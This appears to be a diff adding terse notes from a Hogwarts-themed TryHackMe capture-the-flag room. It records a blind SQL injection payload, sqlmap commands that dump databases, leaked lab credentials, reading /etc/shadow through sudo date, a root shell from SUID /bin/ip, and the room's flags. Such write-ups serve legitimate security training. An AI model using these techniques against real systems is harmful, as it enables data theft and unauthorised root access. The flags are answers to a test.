@@ -1,0 +1,39 @@
+Hogwarts:
+22
+7166
+login page
+vulnerable to SQLI
+username=qGSM' AND (SELECT 5155 FROM (SELECT(SLEEP(5)))pvKm)-- Npsu&password=
+sqlmap http://10.10.253.95:8284/ --forms --dump -D basement
+THM{I-can-be-controlled-by-a-harp}
+sqlmap http://10.10.253.95:8284/ --forms --dump -D students
+hermoine:je5r9cq4@bm!yeng6t1rs98p4
+8284
+also vulnerable to SQLI
+THM{wait-for-your-letter!}
+9883 (SSH)
+hermoine:je5r9cq4@bm!yeng6t1rs98p4
+44537
+priv esc
+/etc/room_of_requirement
+strings
+/bin/sh
+Invisibility cloak: irtbmcxzmzlwmqc288p!ig0nt
+sudo /bin/date with no password (hermoine)
+sudo date -f (whatever file)
+sudo date -f /etc/shadow
+SUID /bin/ip
+ip netns add foo
+ip netns exec foo /bin/sh -p
+root
+there is an .ssh file in root directory
+users
+draco
+sudo nopasswd /usr/bin/easy_install
+flag
+headmaster.txt
+THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
+/home/draco/achievements.txt
+THM{I_unarm3d_dumbled0re}
+/home/harry/special_spell.txt
+THM{Yeah_1_swallowed_the_sn1tch.}
